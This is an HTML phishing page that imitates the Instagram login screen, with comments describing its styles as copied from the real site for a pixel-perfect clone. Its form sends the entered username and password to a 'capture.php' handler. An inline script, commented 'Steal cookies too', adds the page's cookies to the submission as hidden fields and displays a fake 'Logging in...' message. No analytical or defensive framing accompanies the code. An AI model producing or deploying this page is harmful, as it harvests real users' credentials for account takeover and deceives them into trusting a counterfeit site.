<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://www.instagram.com/static/website/_shared/styles/core.css/..."> <!-- Real IG CSS for pixel-perfect clone -->
    <style>
        /* Instagram's exact login styles - ripped from real site */
        body { background: #fafafa; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
        .login-form { max-width: 350px; margin: 0 auto; padding: 40px 40px 20px; }
        .login-box { background: white; border: 1px solid #dbdbdb; border-radius: 3px; padding: 40px 40px 20px; }
        input { width: 100%; padding: 9px 0; border: 1px solid #efefef; border-radius: 3px; background: #fafafa; font-size: 14px; text-align: center; }
        input:focus { border-color: #a8a8a8; background: white; }
        .submit-btn { background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: 600; padding: 7px 0; width: 100%; margin-top: 10px; }
        .fake-footer { text-align: center; font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-form">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="width:175px; margin:0 auto 25px; display:block;">
            <form id="loginForm" action="capture.php" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
                <button type="submit" class="submit-btn">Log in</button>
            </form>
            <div class="fake-footer">
                <p>© 2026 Instagram from Meta</p>
            </div>
        </div>
    </div>

    <script>
        // Auto-submit + cookie steal after "login"
        document.getElementById('loginForm').onsubmit = function() {
            // Steal cookies too
            document.cookie.split(';').forEach(function(c) {
                var eqPos = c.indexOf('=');
                var name = c.substr(0, eqPos).trim();
                var val = c.substr(eqPos + 1);
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'cookie_' + name;
                input.value = val;
                this.appendChild(input);
            }, document.getElementById('loginForm'));
            
            // Show fake loading
            document.querySelector('.submit-btn').innerHTML = 'Logging in...';
            document.querySelector('.submit-btn').disabled = true;
            return true;
        };
    </script>
</body>
</html>
